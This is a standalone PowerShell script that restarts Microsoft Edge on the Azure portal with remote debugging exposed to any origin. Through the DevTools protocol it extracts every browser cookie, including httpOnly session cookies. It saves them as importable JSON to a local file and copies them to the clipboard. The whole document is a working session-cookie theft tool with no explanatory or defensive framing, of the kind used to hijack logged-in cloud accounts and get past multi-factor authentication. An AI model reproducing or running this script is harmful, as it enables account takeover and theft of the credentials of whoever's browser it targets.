Get-Process msedge | Stop-Process
Start-Process "msedge.exe" "https://portal.azure.com --remote-debugging-port=9222 --remote-allow-origins=* --restore-last-session"

$jsonResponse = Invoke-WebRequest 'http://localhost:9222/json' -UseBasicParsing
$devToolsPages = ConvertFrom-Json $jsonResponse.Content
$ws_url = $devToolsPages[0].webSocketDebuggerUrl

$ws = New-Object System.Net.WebSockets.ClientWebSocket
$uri = New-Object System.Uri($ws_url)
$ws.ConnectAsync($uri, [System.Threading.CancellationToken]::None).Wait()

$GET_ALL_COOKIES_REQUEST = '{"id": 1, "method": "Network.getAllCookies"}'
$buffer = [System.Text.Encoding]::UTF8.GetBytes($GET_ALL_COOKIES_REQUEST)
$segment = New-Object System.ArraySegment[byte] -ArgumentList $buffer, 0, $buffer.Length
$ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()

$completeMessage = New-Object System.Text.StringBuilder
do {
    $receivedBuffer = New-Object byte[] 2048
    $receivedSegment = New-Object System.ArraySegment[byte] -ArgumentList $receivedBuffer, 0, $receivedBuffer.Length
    $result = $ws.ReceiveAsync($receivedSegment, [System.Threading.CancellationToken]::None).Result
    $receivedString = [System.Text.Encoding]::UTF8.GetString($receivedSegment.Array, $receivedSegment.Offset, $result.Count)
    $completeMessage.Append($receivedString)
} while (-not $result.EndOfMessage)

$ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "Closing", [System.Threading.CancellationToken]::None).Wait()

try {
    $response = ConvertFrom-Json $completeMessage.ToString()
    $cookies = $response.result.cookies
} catch {
    Write-Host "Error parsing JSON data."
}

$cookieName = "*"  
$specificCookies = $cookies | Where-Object { $_.name -like $cookieName }

# Create an array to store the formatted cookie objects
$cookieObjects = @()  

foreach ($cookie in $specificCookies) {
    # Create a hashtable representing each cookie in a format compatible for import
    $cookieObject = @{
        name       = $cookie.name
        value      = $cookie.value
        domain     = $cookie.domain
        path       = $cookie.path
        secure     = $cookie.secure
        httpOnly   = $cookie.httpOnly
        expirationDate = $cookie.expires
    }

    # Add the cookie object to the array
    $cookieObjects += $cookieObject
}

# Convert the cookie objects array to JSON
$cookieJson = $cookieObjects | ConvertTo-Json -Depth 3

# Output to the console and copy to clipboard
$cookieJson | Out-File C:\temp\cookiesjson.txt
Set-Clipboard -Value $cookieJson
